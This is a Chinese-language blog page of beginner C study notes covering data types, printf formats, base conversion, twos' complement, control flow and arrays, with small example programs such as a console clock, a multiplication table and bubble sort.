<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov a, 3</span><br><span class="line">mov b, 4</span><br><span class="line">mov eax, a </span><br><span class="line">add eax, b</span><br><span class="line">mov c, eax</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>快捷键：<br>断点 F9<br>调试 F5<br>逐语句执行 F11<br>逐过程执行 F10</p>
</blockquote>
<h4 id="寄存器名字"><a href="#寄存器名字" class="headerlink" title="寄存器名字"></a>寄存器名字</h4><p><img src="/2023/12/15/c/image-20231204151902735.png" alt="image-20231204151902735"></p>
<h3 id="三、数据类型"><a href="#三、数据类型" class="headerlink" title="三、数据类型"></a>三、数据类型</h3><img src="/2023/12/15/c/image-20231204152719971.png" alt="image-20231204152719971" style="zoom:67%;">

<h4 id="变量与常量"><a href="#变量与常量" class="headerlink" title="变量与常量"></a>变量与常量</h4><p>1.定义常量名</p>
<p>const 数据类型 常量名 &#x3D; 值;（不建议，不安全</p>
<p>#define 常量名 值;</p>
<p>2.整形变量的定义和输出</p>
<table>
<thead>
<tr>
<th>打印格式</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>%d</td>
<td>输出一个有符号的10进制int类型</td>
</tr>
<tr>
<td>%o</td>
<td>输出8进制的int类型</td>
</tr>
<tr>
<td>%x</td>
<td>输出16进制的int类型，字母以小写输出</td>
</tr>
<tr>
<td>%X</td>
<td>输出16进制的int类型，字母以大写输出</td>
</tr>
<tr>
<td>%u</td>
<td>输出一个10进制的无符号数</td>
</tr>
</tbody></table>
<p>3.进制计算</p>
<h4 id="整形输入"><a href="#整形输入" class="headerlink" title="整形输入"></a>整形输入</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> a;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>出现报错：</p>
<blockquote>
<p>error C4996: ‘scanf’: This function or variable may be unsafe. Consider using scanf_s instead. To disable deprecation, use _CRT_SECURE_NO_WARNINGS</p>
</blockquote>
<p>解决scanf()安全问题</p>
<p>使用</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br></pre></td></tr></table></figure>

<p>或</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:4996)</span></span><br></pre></td></tr></table></figure>

<h4 id="short、int、long、long-long"><a href="#short、int、long、long-long" class="headerlink" title="short、int、long、long long"></a>short、int、long、long long</h4><table>
<thead>
<tr>
<th>数据类型</th>
<th>占用空间</th>
</tr>
</thead>
<tbody><tr>
<td>short</td>
<td>2字节</td>
</tr>
<tr>
<td>int</td>
<td>4字节</td>
</tr>
<tr>
<td>long</td>
<td>Windows为4字节，Linux为4字节(32位)，8字节(64位)</td>
</tr>
<tr>
<td>long long</td>
<td>8字节</td>
</tr>
</tbody></table>
<p>输出时的占位符：</p>
<img src="/2023/12/15/c/image-20231204202543936.png" alt="image-20231204202543936" style="zoom:67%;">

<p>sizeof计算数据类型大小</p>
<img src="/2023/12/15/c/image-20231204203738931.png" alt="image-20231204203738931" style="zoom:50%;">

<h4 id="字符型：char"><a href="#字符型：char" class="headerlink" title="字符型：char"></a>字符型：char</h4><p>定义：char 数据名 &#x3D; ‘字符’;</p>
<p>sizeof(char)  1字节</p>
<p>对应ASCII码表</p>
<h4 id="float-double"><a href="#float-double" class="headerlink" title="float double"></a>float double</h4><img src="/2023/12/15/c/image-20231204205801024.png" alt="image-20231204205801024" style="zoom:50%;">

<p>float和double认为保留小数点后6位是精确的</p>
<p>打印地址编号</p>
<img src="/2023/12/15/c/image-20231204211118884.png" alt="image-20231204211118884" style="zoom: 50%;">

<p>科学计数法打印float：占位符 %e</p>
<img src="/2023/12/15/c/image-20231204211620965.png" alt="image-20231204211620965" style="zoom:67%;">

<p>将科学计数法转换成正常浮点数</p>
<img src="/2023/12/15/c/image-20231204211903963.png" alt="image-20231204211903963" style="zoom:67%;">

<h3 id="四、进制相互转化"><a href="#四、进制相互转化" class="headerlink" title="四、进制相互转化"></a>四、进制相互转化</h3><p><strong>二进制十进制互转：</strong>转低进制，除二反序取余法，转高进制，权值法</p>
<img src="/2023/12/15/c/image-20231204213533505.png" alt="image-20231204213533505" style="zoom: 50%;">

<p><strong>八进制十进制互转：</strong>除八反序取余法，权值法</p>
<img src="/2023/12/15/c/image-20231204214714937.png" alt="image-20231204214714937" style="zoom:50%;">

<p><strong>十进制十六进制互转</strong>：除十六反序取余法</p>
<img src="/2023/12/15/c/image-20231204214848129.png" alt="image-20231204214848129" style="zoom:50%;">

<h5 id="进制转变简单方法"><a href="#进制转变简单方法" class="headerlink" title="进制转变简单方法"></a>进制转变简单方法</h5><p><strong>二进制十进制互转：8421法则</strong></p>
<p>①	11101	16+8+4+0+1&#x3D;29</p>
<p>②	29		29不包含32，从16开始，29-16&#x3D;13，13包含8，13-8&#x3D;5，5包含4，5-4&#x3D;1</p>
<p>​			  所以1 4 8 16分别对应1 100 1000 10000，将这四个数相加得11101</p>
<p><strong>二进制八进制互转：三位一隔</strong></p>
<p>①	11001000100111110101010		从后向前三位一隔	<br>​					11 001 000 100 111 110 101 010<br>​					 3    1     0     4    7     6     5     2</p>
<p>所以11001000100111110101010   &#x3D;&gt;   31047652</p>
<p>②	31047652		将每一位数转换成三位二进制数</p>
<p>​				 3       1        0        4       7        6        5        2<br>​				11    001    000    100    111    110    101    010</p>
<p>​				所以31047652	&#x3D;&gt;	所以11001000100111110101010</p>
<p><strong>二进制十六进制互转：四位一隔</strong></p>
<p>①     7        3          a         b           c<br>​	0111    0011   1010    1011     1100</p>
<p>②0111    0011   1010    1011     1100</p>
<p>​     7        3          a         b           c</p>
<h3 id="五、计算机内存数值存储方式"><a href="#五、计算机内存数值存储方式" class="headerlink" title="五、计算机内存数值存储方式"></a>五、计算机内存数值存储方式</h3><p><strong>原码：</strong></p>
<p>①最高位作为符号位，0为正，1为负<br>②其他数值部分就是数值本身绝对值的二进制数<br>③负数是在绝对值的基础上将最高位变为1</p>
<table>
<thead>
<tr>
<th></th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>+15</td>
<td>0000 1111</td>
</tr>
<tr>
<td>-15</td>
<td>1000 1111</td>
</tr>
<tr>
<td>+0</td>
<td>0000 0000</td>
</tr>
<tr>
<td>-0</td>
<td>1000 0000</td>
</tr>
</tbody></table>
<p>原码表示法简单易懂，与带符号数本身转换比较方便，只要符号还原即可，但是，当两个正数相减或不同符号数相加时，必须比较两个数哪一个绝对值大，才能决定谁减谁，才能决定结果是正是负，所以原码不便于加减运算。</p>
<p><strong>反码：</strong></p>
<p>①对于正数，反码与原码相同</p>
<p>②对于负数，符号位不变，其他部分取反（1,0）</p>
<table>
<thead>
<tr>
<th></th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>+15</td>
<td>0000 1111</td>
</tr>
<tr>
<td>-15</td>
<td>1111 0000</td>
</tr>
<tr>
<td>+0</td>
<td>0000 0000</td>
</tr>
<tr>
<td>-0</td>
<td>1111 1111</td>
</tr>
</tbody></table>
<p>反码运算起来也不方便，通常用来作为求补码的中间过度。</p>
<p><strong>补码：</strong></p>
<p>①对于正数，原码、反码、补码相同<br>②对于负数，补码为它的反码+1<br>③补码符号位不动，其他位求反，最后整个数+1，得到反码</p>
<p><strong>计算：</strong></p>
<p><strong>①</strong>56 - 45  &#x3D;&gt;  56 + （-45）<br>原码：0011 1000<br>反码：0011 1000<br>补码：0011 1000</p>
<p>原码：1010 1101<br>反码：1101 0010<br>补码：1101 0011</p>
<p> 56补码 0011 1000<br>-45补码 1101 0011</p>
<p>56 - 45 补码：1 0000 1011<br>多一位，将第一位舍弃<br>得0000 1011 补码和原码相同 &#x3D;&gt;  11</p>
<p><strong>②</strong>26 - 68<br>原码：0001 1010<br>反码：0001 1010<br>补码：0001 1010</p>
<p>原码：1100 0100<br>反码：1011 1011<br>补码：1011 1100</p>
<p> 26补码：0001 1010<br>-68补码：1011 1100</p>
<p>26 + （-68）<br>补码：1101 0110<br>反码：1101 0101<br>原码：1010 1010  &#x3D;&gt;  -42</p>
<p><strong>数据区间</strong></p>
<p>8bit：-2^7 ~ 2^7-1		-128~127</p>
<p>32bit：-2^31 ~ 2^31-1	-2,147,483,648~2,147,483,647</p>
<p>64bit：-2^63 ~ 2^63-1	-9,223,372,036,854,775,808~9,223,372,036,854,775,807</p>
<p><strong>无符号	数据存储在计算器中不存在符号位</strong><br>unsigned char 0~255</p>
<p>最大值：1111 1111 2^8-1<br>最小值：0000 0000 0</p>
<p>unsigned int 0~4,294,967,295</p>
<p>最大值：1111 1111 1111 1111 1111 1111 1111 1111				2^32-1&#x3D;4,294,967,295<br>最小值：0000 0000 0000 0000 0000 0000 0000 0000		0</p>
<h4 id="数据溢出"><a href="#数据溢出" class="headerlink" title="数据溢出"></a>数据溢出</h4><p>当超出一个数据类型能够存放的最大范围时，数值会溢出</p>
<p>有符号位 最高位溢出的区别：符号位溢出会导致数的正负发生改变，但最高位溢出会导致最高位丢失</p>
<p>如：<img src="/2023/12/15/c/image-20231205151823426.png" alt="image-20231205151823426" style="zoom:50%;"></p>
<h3 id="类型限定"><a href="#类型限定" class="headerlink" title="类型限定"></a>类型限定</h3><table>
<thead>
<tr>
<th>限定符</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>extern</td>
<td>声明一个变量，extern声明的变量没有建立存储空间。extern int a;&#x2F;&#x2F;变量在定义的时候创建存储空间</td>
</tr>
<tr>
<td>const</td>
<td>定义一个常量，常量的值不能修改。<br>const int a &#x3D; 10;</td>
</tr>
<tr>
<td>Volatile</td>
<td>防止编译器优化代码</td>
</tr>
<tr>
<td>register</td>
<td>定义寄存器变量，提高效率。这是建议型指令，而不是命令型指令，如果CPU有空闲寄存器，那么register生效</td>
</tr>
</tbody></table>
<h3 id="printf函数和putchar函数"><a href="#printf函数和putchar函数" class="headerlink" title="printf函数和putchar函数"></a>printf函数和putchar函数</h3><p>printf是输出一个字符串，putchar输出一个char</p>
<p>printf格式字符：</p>
<table>
<thead>
<tr>
<th>打印格式</th>
<th>对应数据类型</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>%d</td>
<td>int</td>
<td>接收整数值并将他表示为有符号的十进制整数</td>
</tr>
<tr>
<td>%hd</td>
<td>short int</td>
<td>短整数</td>
</tr>
<tr>
<td>%hu</td>
<td>unsigned short</td>
<td>无符号短整数</td>
</tr>
<tr>
<td>%o</td>
<td>unsigned int</td>
<td>无符号8进制整数</td>
</tr>
<tr>
<td>%u</td>
<td>unsigned int</td>
<td>无符号10进制整数</td>
</tr>
<tr>
<td>%x,%X</td>
<td>unsigned int</td>
<td>无符号16进制整数，x对应abcdef,X对应ABCDEF</td>
</tr>
<tr>
<td>%f</td>
<td>float</td>
<td>单精度浮点数</td>
</tr>
<tr>
<td>%lf</td>
<td>double</td>
<td>双精度浮点数</td>
</tr>
<tr>
<td>%e,%E</td>
<td>double</td>
<td>科学计数法表示的数，e的大小写代表输出是使用的E的大小写</td>
</tr>
<tr>
<td>%c</td>
<td>char</td>
<td>字符型。可以把输入的数字按照ASCII码相应转换为对应的字符</td>
</tr>
<tr>
<td>%s</td>
<td>char *</td>
<td>字符串。输出字符串中的字符直至字符串中的空字符 <br>（字符串以‘\0结尾，这个\0即空字符’）</td>
</tr>
<tr>
<td>%p</td>
<td>void *</td>
<td>以16进制形式输出指针</td>
</tr>
<tr>
<td>%%</td>
<td>%</td>
<td>输出一个百分号</td>
</tr>
</tbody></table>
<p><strong>printf附加格式：</strong></p>
<img src="/2023/12/15/c/image-20231205190810519.png" alt="image-20231205190810519" style="zoom:50%;">

<img src="/2023/12/15/c/image-20231205191222083.png" alt="image-20231205191222083" style="zoom:50%;">

<img src="/2023/12/15/c/image-20231205192818629.png" alt="image-20231205192818629" style="zoom:50%;">

<h3 id="运算符优先级别"><a href="#运算符优先级别" class="headerlink" title="运算符优先级别"></a>运算符优先级别</h3><img src="/2023/12/15/c/20231205200611.png" alt="20231205200611" style="zoom:50%;">

<h3 id="数据类型转换"><a href="#数据类型转换" class="headerlink" title="数据类型转换"></a>数据类型转换</h3><img src="/2023/12/15/c/image-20231205201220882.png" alt="image-20231205201220882" style="zoom:50%;">

<p>强制转换</p>
<p>格式：(数据类型)变量名;</p>
<p>类型转换原则：占用内存字节数少（值域小）的类型，向占用内存字节数多（值域大）的数据类型转换，以保证精度不降低。<br>从占用字节多的数据类型向占用字节数少的数据类型转换时，会降低精度：</p>
<img src="/2023/12/15/c/image-20231205202152032.png" alt="image-20231205202152032" style="zoom:67%;">

<h3 id="程序流程结构"><a href="#程序流程结构" class="headerlink" title="程序流程结构"></a>程序流程结构</h3><h4 id="1-分支结构"><a href="#1-分支结构" class="headerlink" title="1.分支结构"></a>1.分支结构</h4><h5 id="if结构"><a href="#if结构" class="headerlink" title="if结构"></a>if结构</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(condition)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//表达式</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(consition2)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//表达式</span></span><br><span class="line">&#125;<span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//表达式</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="三目运算符"><a href="#三目运算符" class="headerlink" title="三目运算符"></a>三目运算符</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">表达式1?表达式2:表达式3</span><br></pre></td></tr></table></figure>

<p><strong>如果表达式1为真，则用表达式2作为结果，为假用表达式3作为结果</strong></p>
<img src="/2023/12/15/c/image-20231205204226805.png" alt="image-20231205204226805" style="zoom:50%;">

<p>三目运算符的嵌套</p>
<img src="/2023/12/15/c/image-20231205204525348.png" alt="image-20231205204525348" style="zoom:50%;">

<p>使用#define宏定义表达式</p>
<img src="/2023/12/15/c/image-20231205205033609.png" alt="image-20231205205033609" style="zoom:50%;">

<h4 id="2-选择结构"><a href="#2-选择结构" class="headerlink" title="2.选择结构"></a>2.选择结构</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">switch</span> (switch_on)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> condition1:</span><br><span class="line">	<span class="comment">//</span></span><br><span class="line">	<span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> condition2:</span><br><span class="line">	<span class="comment">//</span></span><br><span class="line">	<span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">	<span class="comment">//</span></span><br><span class="line">	<span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="3-循环结构"><a href="#3-循环结构" class="headerlink" title="3.循环结构"></a>3.循环结构</h4><h5 id="while循环结构"><a href="#while循环结构" class="headerlink" title="while循环结构"></a>while循环结构</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span>(condition)&#123;</span><br><span class="line"><span class="comment">//执行语句</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line">	<span class="comment">//执行语句</span></span><br><span class="line">&#125;<span class="keyword">while</span>(condition)</span><br></pre></td></tr></table></figure>

<p>do…while可以用于第一句执行条件为假，当第一句执行完后条件为真再进行后面循环的情况。</p>
<h5 id="for循环结构"><a href="#for循环结构" class="headerlink" title="for循环结构"></a>for循环结构</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; value; i++)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><em>for循环嵌套实例：时钟</em></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">24</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">60</span>; j++) </span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">60</span>; k++)</span><br><span class="line">			&#123;</span><br><span class="line">				system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;%02d:%02d:%02d&quot;</span>,i,j,k);</span><br><span class="line">				Sleep(<span class="number">980</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><em>实例：九九乘法表</em></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">9</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= i; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%d*%d=%d\t&quot;</span>, j, i, i * j);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="4-跳转语句"><a href="#4-跳转语句" class="headerlink" title="4.跳转语句"></a>4.跳转语句</h4><h5 id="break语句"><a href="#break语句" class="headerlink" title="break语句"></a>break语句</h5><p>1.在switch中，跳出case并结束switch<br>2.在循环中结束循环<br>3.在嵌套循环中，跳出最近循环</p>
<h5 id="continue语句"><a href="#continue语句" class="headerlink" title="continue语句"></a>continue语句</h5><p>结束本次循环，跳到下一次循环</p>
<p>如只输出偶数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">100</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, i);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="goto语句"><a href="#goto语句" class="headerlink" title="goto语句"></a>goto语句</h5><img src="/2023/12/15/c/image-20231206145941501.png" alt="image-20231206145941501" style="zoom:80%;">

<h3 id="六、数组与字符串"><a href="#六、数组与字符串" class="headerlink" title="六、数组与字符串"></a>六、数组与字符串</h3><h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><p>定义数组：数据类型 数组名[元素个数] &#x3D; {值1，值2，值3，……}；</p>
<p><strong>数组在内存中存储方式和大小</strong></p>
<p>数组存储在内存中连续的相同类型鹅变量空间。同一个数组所有的成员都是相同的数据类型，同时所有的成员在内存中的地址是连续的。因此可以通过地址找到数组的下一个</p>
<img src="/2023/12/15/c/image-20231206152557219.png" alt="image-20231206152557219" style="zoom:50%;">

<p><strong>数组名是一个地址常量	指向数组首地址的常量</strong></p>
<img src="/2023/12/15/c/image-20231206153111166.png" alt="image-20231206153111166" style="zoom:50%;">

<p><strong>数组占用内存的大小与数据个数和类型有关</strong></p>
<img src="/2023/12/15/c/image-20231206155931438.png" alt="image-20231206155931438" style="zoom:50%;">

<h4 id="数组逆置"><a href="#数组逆置" class="headerlink" title="数组逆置"></a>数组逆置</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> arr[] = &#123; <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span> &#125;;</span><br><span class="line">	<span class="type">int</span> length = <span class="keyword">sizeof</span>(arr) / <span class="keyword">sizeof</span>(arr[<span class="number">0</span>]);</span><br><span class="line">	<span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">	<span class="type">int</span> j = length - <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">while</span> (i &lt; j)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="type">int</span> temp = arr[i];</span><br><span class="line">		arr[i] = arr[j];</span><br><span class="line">		arr[j] = temp;</span><br><span class="line"></span><br><span class="line">		i++;</span><br><span class="line">		j--;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; length; k++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,arr[k]);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/2023/12/15/c/image-20231206185958346.png" alt="image-20231206185958346" style="zoom:50%;">

<h5 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> arr[] = &#123; <span class="number">10</span>,<span class="number">56</span>,<span class="number">48</span>,<span class="number">79</span>,<span class="number">51</span>,<span class="number">46</span>,<span class="number">95</span>,<span class="number">32</span>,<span class="number">65</span>,<span class="number">98</span> &#125;;</span><br><span class="line">	<span class="type">int</span> length = <span class="keyword">sizeof</span>(arr) / <span class="keyword">sizeof</span>(arr[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; length - <span class="number">1</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; length - <span class="number">1</span> - i; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (arr[j] &gt; arr[j + <span class="number">1</span>])</span><br><span class="line">			&#123;</span><br><span class="line">			<span class="type">int</span> temp = arr[j];</span><br><span class="line">			arr[j] = arr[j + <span class="number">1</span>];</span><br><span class="line">			arr[j + <span class="number">1</span>] = temp;</span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; length; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, arr[i]);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="二维数组"><a href="#二维数组" class="headerlink" title="二维数组"></a>二维数组</h4><p><strong>判断二维数组行数和列数：</strong></p>
<img src="/2023/12/15/c/image-20231206192724601.png" alt="image-20231206192724601" style="zoom:50%;">

<p>** 打印二维数组 **</p>
<img src="/2023/12/15/c/image-20231206192958569.png" alt="image-20231206192958569" style="zoom:50%;">

<h4 id="多维数组"><a href="#多维数组" class="headerlink" title="多维数组"></a>多维数组</h4><h5 id="三维数组"><a href="#三维数组" class="headerlink" title="三维数组"></a>三维数组</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">数据类型 数组名[层][列][行]</span><br></pre></td></tr></table></figure>

<img src="/2023/12/15/c/image-20231206195845078.png" alt="image-20231206195845078" style="zoom:67%;">

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:6328)</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> arr[<span class="number">2</span>][<span class="number">3</span>][<span class="number">4</span>] = &#123; <span class="comment">// 一个数组</span></span><br><span class="line">		&#123; <span class="comment">// 第一层</span></span><br><span class="line">			&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;,</span><br><span class="line">			&#123;<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;,</span><br><span class="line">			&#123;<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>&#125;</span><br><span class="line">		&#125;,</span><br><span class="line">		&#123; <span class="comment">// 第二层</span></span><br><span class="line">			&#123;<span class="number">8</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">5</span>&#125;,</span><br><span class="line">			&#123;<span class="number">7</span>,<span class="number">6</span>,<span class="number">5</span>,<span class="number">4</span>&#125;,</span><br><span class="line">			&#123;<span class="number">6</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">3</span>&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;三维数组大小：%d\n&quot;</span>, <span class="keyword">sizeof</span>(arr));									<span class="comment">//96</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;三维数组每层大小：%d\n&quot;</span>, <span class="keyword">sizeof</span>(arr[<span class="number">0</span>]));							<span class="comment">//48</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;三维数组每层中每行大小：%d\n&quot;</span>, <span class="keyword">sizeof</span>(arr[<span class="number">0</span>][<span class="number">0</span>]));					<span class="comment">//16</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;三维数组每层每行中每个元素的大小：%d\n&quot;</span>, <span class="keyword">sizeof</span>(arr[<span class="number">0</span>][<span class="number">0</span>][<span class="number">0</span>]));		<span class="comment">//4</span></span><br><span class="line">	<span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;层数：%d\n&quot;</span>, <span class="keyword">sizeof</span>(arr) / <span class="keyword">sizeof</span>(arr[<span class="number">0</span>]));</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;行数：%d\n&quot;</span>, <span class="keyword">sizeof</span>(arr[<span class="number">0</span>]) / <span class="keyword">sizeof</span>(arr[<span class="number">0</span>][<span class="number">0</span>]));</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;列数：%d\n&quot;</span>, <span class="keyword">sizeof</span>(arr[<span class="number">0</span>][<span class="number">0</span>]) / <span class="keyword">sizeof</span>(arr[<span class="number">0</span>][<span class="number">0</span>][<span class="number">0</span>]);;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="字符数组"><a href="#字符数组" class="headerlink" title="字符数组"></a>字符数组</h4><p>定义字符数组：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">char 数组名[元素个数] = &#123;&#x27;h&#x27;,&#x27;e&#x27;,&#x27;l&#x27;,&#x27;l&#x27;,&#x27;o&#x27;&#125;;</span><br></pre></td></tr></table></figure>

